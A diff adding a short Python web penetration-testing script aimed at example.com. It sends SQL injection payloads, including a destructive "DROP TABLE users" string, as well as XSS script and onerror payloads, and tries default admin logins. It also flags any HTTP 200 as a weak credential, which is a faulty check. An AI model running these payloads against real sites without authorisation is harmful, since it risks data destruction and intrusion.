@@ -1,0 +1,54 @@
+// WEB APPLICATION PENETRATION TESTING//
+import requests
+
+# Target URL
+target_url = "http://example.com"
+
+# SQL Injection Testing
+def test_sql_injection(url):
+    payloads = ["' OR 1=1 --", "'; DROP TABLE users --", "' OR 'a'='a"]
+    for payload in payloads:
+        response = requests.get(url, params={"input": payload})
+        if "error" in response.text or "syntax" in response.text:
+            print(f"[!] Potential SQL Injection found with payload: {payload}")
+        else:
+            print(f"[-] Payload not vulnerable: {payload}")
+
+# XSS Testing
+def test_xss(url):
+    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
+    for payload in payloads:
+        response = requests.get(url, params={"input": payload})
+        if payload in response.text:
+            print(f"[!] Potential XSS found with payload: {payload}")
+        else:
+            print(f"[-] Payload not vulnerable: {payload}")
+
+# Weak Authentication Mechanism Testing
+def test_insecure_authentication(url):
+    test_credentials = [
+        {"username": "admin", "password": "admin"},
+        {"username": "admin", "password": "password"},
+        {"username": "test", "password": "1234"},
+    ]
+    login_endpoint = f"{url}/login"
+    for creds in test_credentials:
+        response = requests.post(login_endpoint, data=creds)
+        if "Login successful" in response.text or response.status_code == 200:
+            print(f"[!] Weak credentials found: {creds}")
+        else:
+            print(f"[-] Credentials not valid: {creds}")
+
+# Main function
+if __name__ == "__main__":
+    print("Starting Web Application Penetration Testing...")
+    print("\nTesting SQL Injection:")
+    test_sql_injection(target_url)
+
+    print("\nTesting XSS:")
+    test_xss(target_url)
+
+    print("\nTesting Weak Authentication Mechanisms:")
+    test_insecure_authentication(target_url)
+
+    print("\nPenetration Testing Completed.")
